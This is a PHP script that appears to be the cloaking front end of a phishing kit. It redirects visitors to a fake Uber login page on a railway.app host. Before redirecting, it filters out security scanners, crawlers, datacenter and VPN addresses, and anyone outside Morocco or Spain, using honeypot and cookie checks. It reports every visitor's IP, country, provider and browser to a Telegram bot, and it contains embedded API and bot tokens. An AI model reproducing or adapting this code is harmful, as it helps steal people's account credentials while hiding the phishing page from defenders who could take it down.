<?php
// === CONFIG ===
$redirectUrl      = "https://uber-support-production.up.railway.app/newlogin.php";
$allowedCountries = ['MA','ES']; // allowed ISO country codes
$cookieName       = 'real_browser';
$logFile          = __DIR__ . '/access_redirect.log';
$banListFile      = __DIR__ . '/banned_ips.txt';
$rateLimitFile    = __DIR__ . '/ratelimit.json';
$geoCacheFile     = __DIR__ . '/geo_cache.json';
$geoCacheTTL      = 86400; // 24h cache TTL
$ipinfoToken      = "ca8b78d102f513";
$telegramBotToken = "8674511478:AAEsb89Mtibu4oE9BAEkQUGpaj6kbwyrpX8";
$telegramChatId   = "-1003916894717";

// === UTILITIES (no config needed below) ===
function http_get($url) {
    if (function_exists('curl_init')) {
        $ch = curl_init($url);
        curl_setopt_array($ch, [
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_FOLLOWLOCATION => true,
            CURLOPT_TIMEOUT        => 6,
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_USERAGENT      => 'GeoCheck/1.0'
        ]);
        $res = curl_exec($ch);
        curl_close($ch);
        if ($res !== false) return $res;
    }
    if (ini_get('allow_url_fopen')) {
        $ctx = stream_context_create(['http' => ['timeout' => 6, 'header' => "User-Agent: GeoCheck/1.0\r\n"]]);
        return @file_get_contents($url, false, $ctx);
    }
    return false;
}

function getClientIP() {
    foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_REAL_IP','HTTP_X_FORWARDED_FOR','REMOTE_ADDR'] as $h) {
        if (!empty($_SERVER[$h])) {
            $v = $_SERVER[$h];
            if ($h === 'HTTP_X_FORWARDED_FOR') {
                $v = trim(explode(',', $v)[0]);
            }
            if (filter_var($v, FILTER_VALIDATE_IP)) return $v;
        }
    }
    return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
}
function isPublicIP($ip) {
    return (bool) filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE);
}

function cacheGeoGet($ip) {
    global $geoCacheFile, $geoCacheTTL;
    if (!file_exists($geoCacheFile)) return null;
    $cache = @json_decode(file_get_contents($geoCacheFile), true) ?: [];
    if (!isset($cache[$ip])) return null;
    if (time() - ($cache[$ip]['ts'] ?? 0) > $geoCacheTTL) return null;
    return $cache[$ip]['data'] ?? null;
}
function cacheGeoSet($ip, $data) {
    global $geoCacheFile;
    $cache = file_exists($geoCacheFile) ? @json_decode(file_get_contents($geoCacheFile), true) : [];
    if (!is_array($cache)) $cache = [];
    $cache[$ip] = ['ts'=>time(),'data'=>$data];
    @file_put_contents($geoCacheFile, json_encode($cache));
}

function getIPInfo($ip) {
    global $ipinfoToken;
    // cache first
    if ($c = cacheGeoGet($ip)) return $c;

    // private or invalid -> no country
    if (!isPublicIP($ip)) {
        $data = ['country'=>null,'org'=>'private','source'=>'private'];
        cacheGeoSet($ip, $data);
        return $data;
    }

    // 1) ipinfo
    $a = @http_get("https://ipinfo.io/{$ip}?token={$ipinfoToken}");
    if ($a) {
        $j = @json_decode($a, true);
        if (!empty($j['country'])) {
            $data = ['country'=>strtoupper($j['country']),'org'=>$j['org'] ?? ($j['hostname'] ?? ''),'source'=>'ipinfo'];
            cacheGeoSet($ip, $data);
            return $data;
        }
    }

    // 2) ip-api fallback
    $b = @http_get("http://ip-api.com/json/{$ip}?fields=status,country,org,as");
    if ($b) {
        $j = @json_decode($b, true);
        if (($j['status'] ?? '') === 'success' && !empty($j['country'])) {
            $data = ['country'=>strtoupper($j['country']),'org'=>$j['org'] ?? ($j['as'] ?? ''),'source'=>'ip-api'];
            cacheGeoSet($ip, $data);
            return $data;
        }
    }

    // failed
    $data = ['country'=>null,'org'=>null,'source'=>'none'];
    cacheGeoSet($ip, $data);
    return $data;
}

function logAccess($ip, $reason, $ua, $country='-', $org='-') {
    global $logFile, $telegramBotToken, $telegramChatId, $banListFile;
    $date = date('Y-m-d H:i:s');
    @file_put_contents($logFile, "[$date] IP:$ip Country:$country Org:$org Reason:$reason UA:$ua\n", FILE_APPEND);

    if (stripos($reason,'proxy') !== false || stripos($reason,'rate limited') !== false) {
        $list = file_exists($banListFile) ? file($banListFile, FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES) : [];
        if (!in_array($ip, $list)) @file_put_contents($banListFile, "$ip\n", FILE_APPEND);
    }

    $payload = [
        'chat_id' => $telegramChatId,
        'text' => "🚨 *Access*\n*IP:* `$ip`\n*Country:* `$country`\n*Org:* `$org`\n*Reason:* `$reason`\n*UA:* `$ua`\n*Time:* $date",
        'parse_mode' => 'Markdown'
    ];
    @file_get_contents("https://api.telegram.org/bot{$telegramBotToken}/sendMessage?" . http_build_query($payload));
}

function checkRateLimit($ip) {
    global $rateLimitFile;
    $data = file_exists($rateLimitFile) ? json_decode(file_get_contents($rateLimitFile), true) : [];
    $now = time();
    if (!isset($data[$ip])) $data[$ip] = [];
    $data[$ip] = array_values(array_filter($data[$ip], fn($t)=> ($now-$t) < 60));
    $data[$ip][] = $now;
    @file_put_contents($rateLimitFile, json_encode($data));
    return count($data[$ip]) > 10; // >10 req/min -> limit
}

// === START ===
$ip = getClientIP();
$ua = $_SERVER['HTTP_USER_AGENT'] ?? '';

// 0) Ban list
$banList = file_exists($banListFile) ? file($banListFile, FILE_IGNORE_NEW_LINES|FILE_SKIP_EMPTY_LINES) : [];
if (in_array($ip, $banList)) { logAccess($ip, "Banned IP", $ua); http_response_code(403); exit("Access denied."); }

// 1) Honeypot
if (isset($_GET['hp_trap'])) { logAccess($ip,"Honeypot", $ua); http_response_code(403); exit("Go away bot."); }

// 2) Rate limit
if (checkRateLimit($ip)) { logAccess($ip,"Rate limited",$ua); http_response_code(429); exit("Too many requests."); }

// 3) UA filter
$badUA = '/(bot|crawl|spider|wget|curl|headless|python|java|fetch|scrapy|nmap|masscan|powershell|axios|node|perl|phantom|selenium|playwright|httpclient|libwww)/i';
if (!$ua || preg_match($badUA, $ua)) { logAccess($ip,"Blocked: Suspicious UA",$ua); http_response_code(403); exit("Access denied."); }

// 4) JS / Cookie test
if (!isset($_COOKIE[$cookieName])) {
    echo '<html><head><script>document.cookie="'.$cookieName.'=1; path=/";location.reload();</script></head><body><noscript><h1>Enable JavaScript</h1></noscript><form style="display:none"><input name="hp_trap"></form></body></html>';
    exit;
}

// 5) Geo lookup (single-source OK; ip-api used if ipinfo fails)
$info = getIPInfo($ip);
if (empty($info['country'])) {
    logAccess($ip, "Blocked: IP lookup failed", $ua);
    http_response_code(403);
    exit("IP lookup failed.");
}

// 6) Country check (FI only)
if (!in_array($info['country'], $allowedCountries, true)) {
    logAccess($ip, "Blocked country: {$info['country']}", $ua, $info['country'], $info['org'] ?? '-');
    http_response_code(403);
    exit("Country not allowed.");
}

// 7) Datacenter/VPN org block (lightweight)
$dcPatterns = '/\b(amazon|google|ovh|microsoft|digitalocean|hetzner|vultr|contabo|linode|leaseweb|scaleway|oracle|cloudflare|vpn|vps|hosting|cdn)\b/i';
if (!empty($info['org']) && preg_match($dcPatterns, $info['org'])) {
    logAccess($ip, "Blocked proxy: {$info['org']}", $ua, $info['country'], $info['org']);
    http_response_code(403);
    exit("Proxy not allowed.");
}

// 8) Redirect
logAccess($ip, "Redirected", $ua, $info['country'], $info['org'] ?? '-');
header("Location: $redirectUrl", true, 302);
exit;
